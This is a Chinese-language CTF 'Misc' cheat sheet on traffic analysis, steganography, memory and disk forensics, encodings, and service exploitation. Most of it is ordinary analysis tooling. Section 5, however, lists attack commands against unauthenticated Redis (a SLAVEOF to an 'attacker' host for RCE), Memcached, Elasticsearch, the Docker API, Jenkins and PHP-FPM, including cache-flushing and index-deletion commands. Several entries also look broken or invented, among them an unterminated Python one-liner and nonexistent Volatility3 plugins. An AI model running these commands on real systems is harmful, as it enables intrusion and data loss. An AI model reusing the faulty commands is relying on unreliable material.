# Misc 攻防深度手册

## 1. 流量分析

### 1.1 Wireshark 过滤表达式速查

```bash
# HTTP 协议过滤
http.request                                    # 所有 HTTP 请求
http.response                                   # 所有 HTTP 响应
http.request.method == "POST"                   # POST 请求
http.request.uri contains "login"               # URL 含 login
http.response.code == 200                       # 200 响应
http contains "flag"                            # HTTP 中含 flag
http.user_agent contains "curl"                 # User-Agent 过滤
http.request.host contains "admin"              # Host 头过滤

# TCP/UDP 端口过滤
tcp.port == 80                                  # HTTP
tcp.port == 443                                 # HTTPS
tcp.port == 8080                                # HTTP 备用
tcp.port == 3306                                # MySQL
tcp.port == 6379                                # Redis
tcp.port == 22                                  # SSH
tcp.port == 21                                  # FTP
tcp.port == 25                                  # SMTP
tcp.port == 110                                 # POP3
tcp.port == 143                                 # IMAP
tcp.port == 53                                  # DNS
tcp.port == 161                                 # SNMP
udp.port == 53                                  # DNS (UDP)
udp.port == 123                                 # NTP

# IP 过滤
ip.addr == 192.168.1.1                         # 指定 IP
ip.src == 192.168.1.1                          # 源 IP
ip.dst == 192.168.1.1                          # 目的 IP
ip.src == 192.168.1.100 && tcp.port == 80       # 组合过滤

# 协议过滤
dns                                             # 所有 DNS
dns.qry.name contains "flag"                    # DNS 查询含 flag
ftp                                             # FTP
smtp                                            # SMTP
telnet                                          # Telnet
ssh                                             # SSH
http2                                           # HTTP/2
websocket                                       # WebSocket
tls                                             # TLS/SSL
quic                                            # QUIC/HTTP3

# 数据内容过滤
data.data contains "flag"                       # 原始数据含 flag
frame contains "flag"                           # 全帧搜索含 flag
tcp.payload contains "flag"                     # TCP payload 含 flag
http.request.body contains "password"           # 请求体含 password
http.response.body contains "FLAG{"             # 响应体含 FLAG{

# 高级过滤
# 提取 HTTP 文件
http.request.method == "GET" && http.request.uri contains ".php"
# 找上传流量
http.request.method == "POST" && http.content_type contains "multipart"
# 找登录表单
http.request.body contains "username" && http.request.body contains "password"
# 找密码
http.request.body matches "(?i)(password|passwd|pwd)=[^&]+"

# 时间过滤
frame.time >= "2024-01-01 00:00:00" && frame.time <= "2024-12-31 23:59:59"
```

### 1.2 常用操作

```bash
# Follow TCP Stream (重组流量)
# 右键 → Follow → TCP Stream
# 或: tshark -r capture.pcap -z follow,tcp,ascii,0

# HTTP 文件导出
# File → Export Objects → HTTP
# 或: tshark -r capture.pcap --export-objects http,output_dir

# 统计
tshark -r capture.pcap -q -z io,stat,1         # 1秒间隔流量统计
tshark -r capture.pcap -q -z io,phs            # 协议层级统计
tshark -r capture.pcap -q -z conv,tcp          # TCP 会话列表
tshark -r capture.pcap -T fields -e http.request.uri  # 提取所有 URL

# 提取 HTTP 请求/响应
tshark -r capture.pcap -Y "http" -T fields \
  -e frame.number -e ip.src -e ip.dst -e http.request.method -e http.request.uri

# 提取文件
tshark -r capture.pcap --export-objects http,./extracted

# 密码破解
# SSL: SSLKEYLOGFILE + Wireshark
export SSLKEYLOGFILE=/tmp/ssl.log
curl https://target.com  # 生成密钥日志
# Wireshark: Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename

# HTTP Basic Auth 密码提取
tshark -r capture.pcap -Y "http.authbasic" -T fields -e http.authbasic
```

### 1.3 常见流量场景

| 场景 | 过滤方式 | 提取方法 |
|------|---------|---------|
| HTTP 密码 | `http.request.body contains "password"` | Follow TCP Stream |
| Cookie 窃取 | `http.cookie` 或 `http.set_cookie` | 查看 Cookie 头 |
| Webshell 通信 | `http.request.body contains "eval"` | Follow Stream |
| 文件上传 | `http.request.method == "POST" && http.content_type contains "multipart"` | Export HTTP Objects |
| 数据库查询 | `mysql.query` | MySQL 协议解析 |
| Redis 命令 | TCP port 6379 + REQUEST 内容 | 原始 TCP payload |
| DNS 隧道 | `dns.qry.name contains "." && dns.qry.name` 超长 | 异常 DNS 查询 |
| ICMP 隐写 | ICMP 包 data 字段 | 检查 ICMP payload |
| SSH 暴力破解 | `ssh` + `tcp.flags.reset == 1` | 大量 RST 包 |
| HTTP 3xx 跳转 | `http.response.code == 302` | Location 头 |

### 1.4 tshark 实用命令

```bash
# 实时抓包
tshark -i eth0 -w capture.pcap -f "port 80"

# 读取分析
tshark -r capture.pcap -q -z conv,tcp           # 会话列表
tshark -r capture.pcap -q -z io,stat,0          # 总统计
tshark -r capture.pcap -q -z io,phs             # 协议统计

# 高级分析
# 找出可疑会话
tshark -r capture.pcap -q -z conv,tcp | sort -k5 -rn | head -20

# 提取会话数据
tshark -r capture.pcap -Y "ip.src==X && ip.dst==Y" -T fields -e data

# HTTP 文件流
tshark -r capture.pcap -q -z follow,tcp,ascii,0
```

---

## 2. 隐写术

### 2.1 隐写检测决策树

```
收到文件 → 判断类型
  ├── PNG
  │   ├── binwalk -e → 提取嵌入文件
  │   ├── zsteg -a → 全面分析 LSB
  │   ├── zsteg -e → 直接提取
  │   ├── pngcheck -e → chunk 异常检查
  │   ├── pngcheck -v → chunk 详细信息
  │   ├── strings → 查看字符串
  │   ├── 检查 IHDR/IDAT/IEND 结构
  │   └── 检查 IDAT 后是否有附加数据
  ├── JPG/JPEG
  │   ├── binwalk -e → 提取
  │   ├── steghide info → 查看隐写信息
  │   ├── steghide extract → 提取
  │   ├── jsteg reveal → JPG 专用
  │   ├── foremost → 按文件格式恢复
  │   ├── exiftool → EXIF 信息
  │   └── strings → 字符串搜索
  ├── GIF
  │   ├── gifsicle → 分析帧
  │   ├── binwalk → 提取
  │   └── 检查 LSB
  ├── BMP
  │   ├── zsteg → LSB 分析
  │   └── binwalk → 提取
  ├── ZIP
  │   ├── unzip -l → 查看文件列表
  │   ├── 7z x → 强制解压
  │   ├── binwalk -e → 提取嵌入
  │   ├── 检查 zip comment / extra field
  │   └── 伪加密: 文件头 50 4B 01 00 标志
  ├── RAR
  │   ├── unrar x → 解压
  │   ├── binwalk -e → 提取嵌入
  │   └── 检查 RAR 注释
  ├── PDF
  │   ├── pdftotext → 提取文本
  │   ├── pdfinfo → 查看元信息
  │   ├── pdf-parser → 分析结构
  │   ├── binwalk → 提取附件
  │   └── strings → 搜索字符串
  ├── EXE/DLL
  │   ├── peid → 查看壳信息
  │   ├── upx -d → 脱壳
  │   ├── binwalk -e → 提取资源
  │   ├── strings → 字符串
  │   └── Resource Hacker → 查看资源段
  ├── 音频 (WAV/MP3)
  │   ├── steghide → 音频隐写
  │   ├── Audacity → 可视化波形
  │   ├── Sonic Visualiser → 频谱图
  │   └── 检查采样率/DCT
  ├── 文本
  │   ├── 空格隐写 → 检查行尾空格/Tab
  │   ├── 零宽字符 → 检查 Unicode 零宽字符
  │   ├── 摩斯电码 → 识别 .- 模式
  │   ├── Brainfuck → 识别 ,. 符号
  │   └── JSFuck/PUA → 识别混淆代码
  └── QR Code
      ├── zxing → 解码
      ├── qrdecode → 解码
      └── 检查隐藏在二维码中的数据
```

### 2.2 隐写工具速查

```bash
# binwalk (最通用)
binwalk image.png          # 分析
binwalk -e image.png       # 自动提取嵌入文件
binwalk -M image.png       # 伪文件检测
binwalk --run-as-root -e image.png  # root 权限提取

# zsteg (PNG/BMP LSB)
zsteg image.png            # 分析
zsteg -a image.png         # 全通道分析
zsteg -e image.png         # 提取数据
zsteg -b image.png         # 提取到文件
zsteg -z image.png         # 调试模式

# steghide (JPG/音频)
steghide info image.jpg    # 查看隐写信息
steghide extract -sf image.jpg  # 提取(无密码)
steghide extract -sf image.jpg -p password  # 带密码提取

# foremost (文件恢复)
foremost -i image.jpg -o output_dir  # 按格式恢复文件

# pngcheck (PNG 专用)
pngcheck -e image.png      # 检查 chunk 异常
pngcheck -v image.png      # 详细 chunk 信息

# exiftool (EXIF 信息)
exiftool image.jpg         # 查看 EXIF 元数据
exiftool -Orientation= image.jpg  # 清除方向信息

# binwalk 提取后
cd _image.png.extracted    # 进入提取目录
ls -la                     # 查看提取的文件
file *                     # 识别文件类型
```

### 2.3 特殊隐写技术

```bash
# 1. 空格隐写 (文本文件)
# 行尾空格代表 0，Tab 代表 1
python3 -c "
lines = open('stego.txt').readlines()
bits = ''
for line in lines:
    if line.endswith(' \n'): bits += '0'
    elif line.endswith('\t\n'): bits += '1'
    elif line.endswith('  \n'): bits += '00'
    elif line.endswith('\t\t\n'): bits += '11'
print(bits)
# 再将二进制转为文本

# 2. 零宽字符隐写
# 使用 Unicode 零宽字符: U+200B (ZWSP), U+200C (ZWNJ), U+200D (ZWJ)
# 每个字符编码 2 bit

# 3. 音频频谱图
# Audacity: 打开音频 → 频谱图视图
# Sonic Visualiser: 分析频谱

# 4. JSteg (JPG DCT 隐写)
java -jar jsteg.jar reveal image.jpg password output.txt

# 5. F5 隐写
python3 F5.py image.jpg -d password

# 6. 图片拼接 (Append)
# 文件末尾附加: binwalk 可检测
# 检查: strings image.jpg | tail -c 1000 image.jpg

# 7. 利用 EXIF 数据
exiftool -Artist="flag{xxx}" image.jpg  # 写入 EXIF
exiftool image.jpg                      # 读取 EXIF

# 8. GIF 帧间隐写
gifsicle --info image.gif   # 查看帧信息
# 比较每帧的 LSB 差异
```

---

## 3. 取证分析

### 3.1 内存取证 (Volatility3)

```bash
# 基本命令
vol -f mem.raw windows.info              # 系统信息
vol -f mem.raw windows.pslist            # 进程列表
vol -f mem.raw windows.pslist --pid 1234  # 指定进程
vol -f mem.raw windows.netscan           # 网络连接
vol -f mem.raw windows.cmdscan           # 命令执行历史
vol -f mem.raw windows.filescan          # 文件扫描
vol -f mem.raw windows.dumpfiles         # 导出所有文件
vol -f mem.raw windows.handles           # 句柄列表
vol -f mem.raw windows.memorymap         # 内存映射
vol -f mem.raw windows.modules           # 加载模块

# 注册表分析
vol -f mem.raw windows.registry.hivescan  # 注册表 HIVEs
vol -f mem.raw windows.registry.printkey --key "Software"
vol -f mem.raw windows.registry.printkey --key "Microsoft\\Windows\\CurrentVersion\\Run"
vol -f mem.raw windows.registry.printkey --key "SAM"

# 进程注入检测
vol -f mem.raw windows.dlllist           # DLL 列表
vol -f mem.raw windows.suspicious_threads # 可疑线程
vol -f mem.raw windows.handles -p 4      # 句柄列表(PID 4)

# 凭据提取
vol -f mem.raw windows.lazydump           # Lazagne 密码
vol -f mem.raw windows.mimikatz           # Mimikatz
vol -f mem.raw windows.credentialmanager # 凭据管理器

# 字符串搜索
vol -f mem.raw windows.strings            # 全内存字符串
vol -f mem.raw windows.strings -s         # 带偏移
# grep 搜索
vol -f mem.raw windows.dumpfiles --pid 1234  # 导出进程文件

# Linux 内存
vol -f mem.raw linux.info
vol -f mem.raw linux.pslist
vol -f mem.raw linux.netscan
vol -f mem.raw linux.bash
vol -f mem.raw linux.sockstat
vol -f mem.raw linux.dmesg
```

### 3.2 磁盘取证

```bash
# Autopsy (GUI)
# 启动: autopsy
# 加载镜像 → 分析

# FTK Imager
# 创建镜像 → 挂载分析

# 文件恢复
foremost -i disk.img -o recovered/       # 按格式恢复
photorec /dev/sda1                       # 交互式恢复
testdisk                                 # 分区恢复

# 日志分析
# Web 日志
grep "flag" access.log                   # 搜索 flag
grep -E "GET|POST" access.log | head -20  # 前 20 条请求
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10  # IP 统计

# 系统日志
grep -i "error" /var/log/syslog          # 错误
grep -i "fail" /var/log/auth.log         # 认证失败
last                                     # 登录历史
lastb                                    # 失败登录
```

### 3.3 Docker 取证

```bash
# 查看镜像
docker images
docker history image_id                  # 构建历史
docker save image_id -o image.tar        # 导出镜像

# 分析镜像
mkdir docker_extract && cd docker_extract
tar xf image.tar
ls -la
cat manifest.json                        # 镜像清单
cat config.json                          # 配置信息

# 提取各层
for layer in layer.tar.gz layer.tar; do
    tar xf "$layer"
done

# 分析文件系统
find . -name "*.sh" -o -name "*.json" -o -name "*.conf"
cat etc/shadow
cat var/log/auth.log
```

---

## 4. 编码/解码速查

### 4.1 常见编码解码

```bash
# Base64
echo 'SGVsbG8=' | base64 -d              # 解码
echo 'Hello' | base64                     # 编码

# Base32
echo 'JBSWY3DP' | base32 -d
echo 'Hello' | base32

# Base58
python3 -c "import base58; print(base58.b58decode('...').decode())"

# Hex (十六进制)
echo '48656c6c6f' | xxd -r -p            # 解码 hex → string
echo -n 'Hello' | xxd -p                  # 编码 string → hex

# 字符 ↔ Hex
python3 -c "print(''.join(f'\\x{ord(c):02x}' for c in 'Hello'))"

# URL 编码
python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6c%6c%6f'))"
python3 -c "import urllib.parse; print(urllib.parse.quote('Hello World'))"

# ROT13
echo 'Uryyb' | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# ROT47
python3 -c "
def rot47(s):
    r = ''
    for c in s:
        o = ord(c)
        if 33 <= o <= 126:
            r += chr(33 + ((o - 33 + 47) % 94))
        else:
            r += c
    return r
print(rot47('Hello'))
"

# Morse 摩斯电码
# 解码字典
morse = {
    '.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E',
    '..-.':'F','--.':'G','....':'H','..':'I','.---':'J',
    '-.-':'K','.-..':'L','--':'M','-.':'N','---':'O',
    '.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T',
    '..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y',
    '--..':'Z','...---...':'SOS'
}

# Brainfuck
# 在线解释器: https://www.brainfuck.org/

# JSFuck (极度混淆)
# 在线解码: https://www.jsfuck.com/

# PUA (PDF Unicode Abbreviated)
# 解码: 将 Unicode 片段拼接

# Unicode Escaping
python3 -c "print('\u4f60\u597d')"        # 你好

# Octal
python3 -c "print('\110\145\154\154\157')"  # Hello

# 混合编码识别
# 看特征:
# Base64: 长度4倍数 + A-Za-z0-9+/=
# Hex: 偶数长度 + 0-9a-f
# Base32: A-Z2-7
# URL: %XX 格式
# Morse: .-_/分隔
```

### 4.2 在线工具

```
CyberChef: https://cyberchef.org/
    - 支持 100+ 编码/解码
    - 支持链式操作
    - 支持自定义 Python 脚本
```

---

## 5. 协议分析

### 5.1 端口 → 协议 → 利用工具

| 端口 | 协议 | 探测 | 利用 |
|------|------|------|------|
| 21 | FTP | `nmap -p 21 --script ftp-anon` | `ftp`, `hydra` |
| 22 | SSH | `nmap -p 22 --script ssh-auth-methods` | `ssh`, `hydra`, `medusa` |
| 23 | Telnet | `nmap -p 23` | `telnet`, `hydra` |
| 25 | SMTP | `nmap -p 25 --script smtp-enum-users` | `smtp-user-enum`, `swaks` |
| 53 | DNS | `nmap -p 53 --script dns-brute` | `dig`, `dnsenum`, `fierce` |
| 80 | HTTP | `nmap -p 80 --script http-enum` | `curl`, `Burp`, `dirsearch` |
| 110 | POP3 | `nmap -p 110` | `openssl s_client`, `hydra` |
| 135 | MSRPC | `nmap -p 135` | `impacket` |
| 137-139 | NetBIOS | `nmap -p 137-139 --script smb-os-discovery` | `enum4linux`, `smbclient` |
| 143 | IMAP | `nmap -p 143` | `openssl s_client`, `hydra` |
| 443 | HTTPS | `nmap -p 443 --script ssl-enum-ciphers` | `curl -k`, `Burp` |
| 445 | SMB | `nmap -p 445 --script smb-vuln-*` | `smbclient`, `enum4linux`, `impacket` |
| 3306 | MySQL | `nmap -p 3306 --script mysql-info` | `mysql`, `hydra` |
| 3389 | RDP | `nmap -p 3389 --script rdp-enum-encryption` | `rdesktop`, `hydra` |
| 5432 | PostgreSQL | `nmap -p 5432` | `psql`, `hydra` |
| 6379 | Redis | `nmap -p 6379 --script redis-info` | `redis-cli` (未授权) |
| 8080 | HTTP-Alt | `nmap -p 8080 --script http-enum` | `curl`, `Burp` |
| 9200 | Elasticsearch | `curl http://target:9200/_cat/indices` | 未授权访问 |
| 11211 | Memcached | `echo "stats" | nc target 11211` | 未授权 |
| 27017 | MongoDB | `nmap -p 27017` | `mongo` (未授权) |
| 50070 | Hadoop | `curl http://target:50070` | HDFS 未授权 |

### 5.2 特定协议利用

```bash
# SMB 匿名访问
smbclient -L //target -N
smbclient //target/share -N

# 枚举信息
enum4linux -a target
enum4linux -u admin -p password target

# Redis 未授权
redis-cli -h target
redis-cli -h target INFO
redis-cli -h target CONFIG GET dir
redis-cli -h target SLAVEOF attacker 6379  # 主从复制 RCE

# Memcached 未授权
echo "stats" | nc target 11211
echo "stats slabs" | nc target 11211
echo "flush_all" | nc target 11211  # 清空缓存

# Elasticsearch 未授权
curl http://target:9200/_cat/indices?v
curl http://target:9200/_search?q=flag
curl -X DELETE http://target:9200/索引名  # 删除

# MongoDB 未授权
mongo target --eval "db.adminCommand('listDatabases')"
mongo target  # 交互式

# Hadoop HDFS
hdfs dfs -ls hdfs://target:50070/
hdfs dfs -cat hdfs://target:50070/flag

# Docker API 未授权
curl http://target:2375/v1.24/containers/json
# → 创建容器挂载根目录获取 flag

# Jenkins 未授权
curl http://target:8080/api/json
# Script Console → 执行 Groovy: "cat /flag".execute().text

# PHP-FPM 未授权 RCE
# 通过 FastCGI 协议发送请求
cgi-fcgi -bind -connect target:9000 /cgi-bin/php%2e%2e%2fflag
```

### 5.3 网络扫描

```bash
# 快速扫描
nmap -sS -T4 -p- target                # 全端口 TCP SYN 扫描
nmap -sV -p 1-10000 target             # 服务版本扫描
nmap -sC -sV target                     # 默认脚本扫描
nmap -A target                          # 综合扫描
nmap -sU --top-ports 100 target         # UDP 扫描

# 批量扫描
for i in {1..20}; do
    nmap -p 80,443,8080,8443,3306,6379,27017 -sV 192.168.1.$i &
done

# 存活检测
fping -a -g 192.168.1.0/24 2>/dev/null
nmap -sn 192.168.1.0/24               # Ping 扫描
arp-scan -l                             # ARP 扫描
```

---

## 6. 常用工具清单

### 6.1 流量分析
| 工具 | 说明 |
|------|------|
| Wireshark | 综合流量分析 |
| tshark | 命令行流量分析 |
| tcpdump | 抓包工具 |
| NetworkMiner | 网络取证 |
| HTTP-Files-Dissector | HTTP 文件提取 |
| mitmproxy | 中间人代理 |

### 6.2 隐写工具
| 工具 | 说明 |
|------|------|
| binwalk | 嵌入式文件分析 |
| foremost | 文件恢复 |
| zsteg | PNG/BMP LSB 隐写 |
| steghide | JPG/音频隐写 |
| exiftool | EXIF 元数据 |
| pngcheck | PNG 检查 |
| gifsicle | GIF 操作 |
| jsteg | JPG DCT 隐写 |
| F5.py | F5 隐写 |

### 6.3 取证工具
| 工具 | 说明 |
|------|------|
| Volatility3 | 内存取证 |
| Autopsy | 磁盘取证 |
| FTK Imager | 磁盘镜像 |
| photorec | 文件恢复 |
| testdisk | 分区恢复 |
| docker-explorer | Docker 镜像分析 |

### 6.4 编码/解码
| 工具 | 说明 |
|------|------|
| CyberChef | 瑞士军刀（在线） |
| python3 base64 | 命令行 Base64 |
| xxd | Hex ↔ String |
| iconv | 编码转换 |
| uchardet | 编码检测 |
```